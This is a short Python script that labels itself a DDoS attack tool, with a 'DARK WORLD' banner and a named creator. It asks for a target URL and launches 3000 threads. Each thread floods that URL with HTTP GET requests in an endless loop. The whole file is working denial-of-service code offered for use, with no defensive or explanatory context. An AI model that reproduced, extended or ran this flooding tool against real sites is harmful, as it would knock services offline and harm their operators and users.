import requests
import threading

# Function to send HTTP requests
def send_request(url):
    while True:
        try:
            response = requests.get(url)
            print(f"Sent request to {url}")
        except requests.exceptions.RequestException as e:
            print(f"Error sending request to {url}: {e}")

# Main function
def main():
    # Display banner
    print("DARK WORLD")
    print("Creator: Rahad Hasan")

    # Get the target URL from the user
    target_url = input("Enter the target URL: ")

    # Start the DDoS attack
    print("Starting DDoS attack...")
    for _ in range(3000):
        # Create a new thread for each request
        thread = threading.Thread(target=send_request, args=(target_url,))
        thread.start()

# Run the script when executed as the main program
if __name__ == "__main__":
    main()
